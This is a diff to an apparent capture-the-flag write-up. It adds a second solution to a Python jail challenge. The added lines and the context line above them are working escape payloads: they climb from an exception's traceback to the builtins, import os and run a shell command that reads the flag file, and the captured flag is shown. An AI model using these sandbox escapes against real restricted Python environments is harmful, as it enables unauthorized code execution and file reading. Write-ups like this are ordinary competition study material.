@@ -295,3 +295,18 @@ cat ../flag*
 1/0
 [[[ex:=[ex["eval"] if idx=="d" else ex.__getattribute__][0](x)][0] for x in ["__traceback__" if idx == "a" else "tb_frame" if idx=="b" else "f_builtins" if idx=="c" else "ex['__import__']\x28'os'\x29\x2esystem\x28'cat /flag*'\x29"]][0] for idx in "abcd"]
 ```
+
+A similar solution to mime by @huongnoi100%:
+
+```python
+jail> {}[lambda d:[*d][0].__getattribute__(d[[*d][0]]),0]
+{}[ex.args[0][0],ex]
+{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'__traceback__'})]
+{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'tb_frame'})]
+{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'f_globals'})['__builtins__']]
+{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'__import__'})]
+{}[[s:=ex.args[0]] and s[0],s[1]('os')]
+{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'system'})]
+{}[[s:=ex.args[0]] and s[0],s[1]('cat /flag-*')]
+jail> jail> jail> jail> jail> jail> jail> jail> SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}
+```
